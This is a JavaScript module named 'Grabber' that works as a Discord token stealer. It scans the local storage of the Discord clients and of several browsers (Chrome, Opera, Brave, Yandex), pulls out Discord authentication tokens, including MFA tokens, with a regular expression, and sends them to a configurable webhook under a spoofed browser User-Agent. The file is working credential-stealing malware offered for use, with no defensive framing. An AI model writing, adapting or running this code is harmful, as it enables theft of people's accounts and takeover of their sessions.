const { readdirSync, readFileSync, existsSync } = require('fs');
const fetch = require('node-fetch');

class Grabber {
    constructor({ WEBHOOK_URL, ping } = {}) {
        this.WEBHOOK_URL = WEBHOOK_URL || '';
        this.ping = ping || true;
        this.regex = new RegExp("\"([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84})\"", 'g');
    }

    findTokens(path) {
        path += '\\Local Storage\\leveldb';
        const tokens = [];

        for (const file of readdirSync(path)) {
            if (!file.endsWith('.log') && !file.endsWith('.ldb')) continue;

            const file_buffer = readFileSync(`${path}\\${file}`).toString('utf-8');
            if (!file_buffer) continue;

            const matches = file_buffer.match(this.regex);
            if (!matches) continue;
            
            tokens.push(...matches);
        }

        return tokens;
    }

    grabTokens() {
        const local = process.env.LOCALAPPDATA;
        const roaming = process.env.APPDATA;

        const paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        let message = this.ping ? '@everyone' : '';
        let tokens;

        for (const [platform, path] of Object.entries(paths)) {
            if (!existsSync(path)) continue;

            message = `\n**Platform:** ${platform}\n`;

            tokens = this.findTokens(path);

            if (tokens.length) {
                message += `${tokens.map(m => `\`\`\`js\n${m}\`\`\``).join('\n')}`;
            } else {
                message += 'No tokens found.\n';
            }
        }

        fetch(this.WEBHOOK_URL, {
            method: 'POST',
            body: JSON.stringify({
                content: message
            }),
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
            }
        });
    }
}

module.exports = Grabber;